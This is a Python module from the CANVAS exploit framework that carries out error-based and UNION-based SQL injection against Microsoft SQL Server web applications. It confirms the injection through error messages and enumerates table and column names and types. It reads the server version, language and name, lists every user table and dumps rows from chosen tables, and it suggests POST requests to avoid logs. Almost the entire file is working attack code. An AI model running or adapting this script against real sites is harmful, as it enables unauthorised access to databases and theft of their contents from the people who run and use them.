#! /usr/bin/env python

"""
CANVAS: Microsoft SQL Server Injection Routines
Version 1.0

See the bottom of the Run function for the ability to pull back arbitrary tables.
"""

import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
import time

from canvasexploit import canvasexploit

NAME                         = "mssqlinject"
DOCUMENTATION                = {}
DOCUMENTATION["Description"] = "MS SQL Injection Routines"

DESCRIPTION                  = "MS SQL Injection Routines"
VERSION                      = "1.0"
PROPERTY                     = {}
PROPERTY['TYPE']             = "Web Exploits"


def geturl(url, post):
    """
    Gets a URL via GET or POST
    returns None on errors
    """
    import urllib
    newurl = url.split("?")[0]
    try:
        urldict=splitargs(url.split("?")[1])
    except Exception:
        urldict={}
        
    params = urllib.urlencode(urldict)

    if post:
        inurl=urllib.urlopen(newurl,params)
    else:
        newurl=newurl+"?"+params
        inurl=urllib.urlopen(newurl)
    if inurl==None:
        return None

    data=inurl.read()
    return data

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name       = NAME
        self.path       = "/file.asp?ID=1'"
        self.failstring = "Peas"
        self.vhost      = ""
        self.post       = False

    def getargs(self):
        self.getarg("vhost")
        self.getarg("path")
        self.getarg("post")
        
    def run(self):
        self.getargs()
        self.run_attack()

    def run_attack(self, queryTable=None, queryTable2=None, queryColumn=None):
        """
        runs a recon on the server to make sure things are working properly, from our perspective
        The SQL Injection variable must be last
        """

        url  = 'http://'
        url += self.vhost or self.target.resolved_from
        url += self.path
        
        post = self.post
        
        if post: self.log("Using POST rather that GET to avoid logs")

        self.log("Recon 1 on %s"%url)
        data = geturl(url,post)
        
        if data == None:
            self.log("Could not open that url, sorry.")
            return
        
        self.log("Data=%s"%data)
        
        if data.count("Unclosed quotation mark") == 0:
            self.log("Did not see SQL Injection vuln there. Looking for 'Unclosed quotation mark'")
            self.log(data)
            return

        self.log("Unclosed Quotation Mark verified. Continuing")

        #now run having clause to get table name and first column name
        arguments = " having 1=1'"
        havingurl = url+arguments + "--"
        
        #print "HavingURL=%s"%havingurl
        data = geturl(havingurl, post)
        try:
            name = data.split("Error Type")[1].split("'")[1]
        except Exception:
            self.log("Unable to determine Error type from data: %s"%data)
            return

        tablename = name.split(".")[0]
        columnnames = []
        #print "name=%s"%data
        columnnames.append(name.split(".")[-1])
        #self.log("Found table *%s* column *%s*"%(tablename,columnnames[0]))

        done=0
        while not done:
            arguments="GROUP BY "+",".join(columnnames)+" having 1=1"
            newurl=url+arguments+"--"
            #print "New URL=%s"%newurl
            data=geturl(newurl,post)
            if data.count("Error Type")==0:
                done=1
                break
            name=data.split("Error Type")[1].split("'")[1]
            #print data
            newcolumn=name.split(".")[1]
            #print "new column="+newcolumn
            columnnames.append(newcolumn)


        #print "Column names = %s"%str(columnnames)
        #now we get the types
        columntypes={}
        for columnname in columnnames:
            arguments="GROUP BY "+",".join(columnnames)+" having cast("+columnname+" as image)=1"
            newurl=url+arguments+"--"
            data=geturl(newurl,post)
            if data.count("Error Type")==0:
                #Actually because we compare to 1, this will never happen."
                print "Some weird error occured - we didn't get Error Type when trying to find the type of %s"%columnname
                print "data=%s"%data
                return
            elif data.count("from data type int"):
                type="int"
            elif data.count("The text, ntext, and image"):
                type="text"
            else:
                self.log("TYPE not recognized - - %s"%data)
                type="UNKNOWN"

            columntypes[columnname]=type
            #print "Columntypes=%s"%str(columntypes)
        self.log("The current table %s has the following columns and types: %s"%(tablename,str(columntypes)))

        #for column in columnnames:
        #  self.getTableColumns(tablename,column)

        versionquery=url+" AND @@VERSION=1--"
        data=geturl(versionquery,post)
        self.log("Version = %s"%data.split("nvarchar value ")[1].split("to a column")[0])

        query=url+" AND @@LANGUAGE=1--"
        data=geturl(query,post)
        #print "DATA="+data
        self.log("Language = %s"%data.split("nvarchar value ")[1].split("to a column")[0])

        query=url+" AND @@SERVERNAME=1--"
        data=geturl(query,post)
        #print "DATA="+data
        self.log("SERVERNAME = %s"%data.split("nvarchar value ")[1].split("to a column")[0] )

        numcolumns=self.getQueryColumns()
        self.log( "Number of Columns in this query is %d"%numcolumns)

        ####HERE IS EXTRA STUFF YOU MAY WANT TO DO!
        self.getAllTables(numcolumns)
        #Just some examples...you could change this to do random other things...
        #self.getAllColumnNames("master..sysobjects")
        #self.getTableColumns(numcolumns,"master..sysobjects","name")
        if queryTable!=None:
            self.getAllColumnNames(queryTable)

        if queryTable2!=None and queryColumn!=None:
            self.getTableColumns(numcolumns,queryTable2,queryColumn)
        return

    def getAllColumnNames(self,table):
        """
        Gets a list of the column names from a table
        """

        url  = 'http://'
        url += self.vhost or self.target.resolved_from
        url += self.path        

        post = self.post
        columnnames=[]
        #need to get first columnname
        arguments="; SELECT * FROM "+table+" having 1=1"
        newurl=url+arguments+"--"
        #print "New URL=%s"%newurl
        data=geturl(newurl,post)

        name=data.split("Error Type")[1].split("'")[1]
        #tablename=name.split(".")[0]
        #print "name=%s"%name
        newcolumnname=name.split(".")[-1]
        #print "New Column Name=%s"%newcolumnname
        columnnames.append(newcolumnname)

        while 1:
            arguments="; SELECT * FROM "+table+" GROUP BY "+",".join(columnnames)+" having 1=1"
            newurl=url+arguments+"--"
            #print "New URL=%s"%newurl
            data=geturl(newurl,post)
            if data.count("Error Type")==0:
                break
            #print "DATA=%s\nENDDATA"%data
            name=data.split("Error Type")[1].split("'")[1]
            #print data
            newcolumn=name.split(".")[-1]
            #print "new column="+newcolumn
            columnnames.append(newcolumn)
        self.log("All Column names in that table: %s"%(str(columnnames)))
        return


    def getQueryColumns(self):
        """
        Gets the number of objects in the current query
        """
        url  = 'http://'
        url += self.vhost or self.target.resolved_from
        url += self.path

        current="name"
        i=1
        while i<50:
            query=url + "UNION (SELECT "+current+" FROM master..sysobjects WHERE type='U')--"
            data=geturl(query,self.post)
            if data.count("All queries in an"):
                i+=1
                current+=",name"
            else:
                #print data
                break

        return i

   
    def getAllTables(self, numcols):
        """
        Gets all the tables in the database
        """
        url  = 'http://'
        url += self.vhost or self.target.resolved_from
        url += self.path

        names="name"
        namesList=[]
        knownnames="''"
        for i in range(numcols-1):
            names+=",name"
        while 1:
            query=url
            query+="UNION  ( SELECT "+names+" FROM master..sysobjects WHERE name="
            query+="(SELECT TOP 1 name FROM master..sysobjects WHERE type='U' AND name NOT IN ("+knownnames+"))"
            query+=" GROUP BY name HAVING (name+'a')=1)--"
            #print "Query is %s"%query
            data=geturl(query,self.post)
            #print data
            if data.count("nvarchar value '"):
                newname=data.split("nvarchar value '")[1].split("'")[0][:-1]
            else:
                #print data
                break
            #print "Newname=%s"%newname
            knownnames+=",'%s'"%newname
            namesList.append(newname)
        print "Table names are %s"%str(knownnames)
        return

    def getTableColumns(self,numcols,tablename,columnname):
        """
        Gets all of the rows in a particular table and column
        """
        self.log("Tablename = %s Columnname=%s"%(tablename,columnname))

        url  = 'http://'
        url += self.vhost or self.target.resolved_from
        url += self.path
        
        names=columnname
        namesList=[]
        knownnames="''"
        for i in range(numcols-1):
            names+=","+columnname
        while 1:
            query=url
            query+="UNION  ( SELECT "+names+" FROM "+tablename+" WHERE "+columnname+"="
            query+="(SELECT TOP 1 name FROM "+tablename+" WHERE "+columnname+" NOT IN ("+knownnames+"))"
            query+=" GROUP BY "+columnname+" HAVING ("+columnname+"+'a')=1)--"
            #print "Query is %s"%query
            data=geturl(query,self.post)
            #print data
            if data.count("nvarchar value '"):
                newname=data.split("nvarchar value '")[1].split("'")[0][:-1]
            else:
                #print data
                break
            print "Newname=%s"%newname
            knownnames+=",'%s'"%newname
            namesList.append(newname)
        self.log("Values are %s"%str(knownnames))
        return


#this stuff happens if we are called from the command line
if __name__ == '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)


